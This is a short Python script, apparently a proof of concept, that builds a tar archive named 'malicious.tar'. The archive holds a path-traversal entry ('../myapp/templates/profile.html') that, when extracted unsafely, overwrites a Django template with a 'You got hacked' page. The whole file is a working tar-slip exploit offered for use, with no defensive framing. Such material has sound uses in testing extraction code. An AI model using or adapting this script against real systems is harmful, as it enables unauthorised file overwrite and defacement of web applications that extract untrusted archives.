import tarfile
import io

def create_malicious_tar():
    with tarfile.open('malicious.tar', 'w') as tar:
        # Add a file that will be extracted to the Django project directory
        tarinfo = tarfile.TarInfo(name='../myapp/templates/profile.html')
        hacked_html = b'''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Profile Page</title>
            <style>
                body { font-family: Arial, sans-serif; }
                h1 { color: red; }
            </style>
        </head>
        <body>
            <h1>You got hacked</h1>
        </body>
        </html>
        '''
        tarinfo.size = len(hacked_html)
        tar.addfile(tarinfo, io.BytesIO(hacked_html))

if __name__ == '__main__':
    create_malicious_tar()